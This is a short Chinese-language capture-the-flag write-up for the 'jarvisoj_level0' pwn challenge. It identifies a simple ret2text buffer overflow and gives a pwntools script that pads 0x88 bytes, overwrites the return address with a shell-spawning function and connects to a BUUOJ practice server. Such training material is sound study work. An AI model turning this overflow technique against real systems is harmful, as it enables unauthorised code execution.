---
title: "jarvisoj_levelo"
description: ""
date: 2023-04-06T19:14:38+08:00
lastmod: 2023-04-06T19:14:38+08:00
draft: false
images: []
type: docs
weight: 998
toc: true
---

## 0x01 分析

![fed3eaa144287a208a711c47c17d2456](images/fed3eaa144287a208a711c47c17d2456.png)  

并且程序存在直接getshell的函数

![012323d7e8428904411f61afc9f05c2c](images/012323d7e8428904411f61afc9f05c2c.png)  

简单的ret2text类型

## 0x02 Exploit

```python
from pwn import*
o = remote('node4.buuoj.cn', 27978)
payload = b'a'*0x88 + p64(0x400596)
o.sendline(payload)
o.interactive() 
```

![dedff31f40f92a167436355d83188f17](images/dedff31f40f92a167436355d83188f17.png)  

自行调试分析
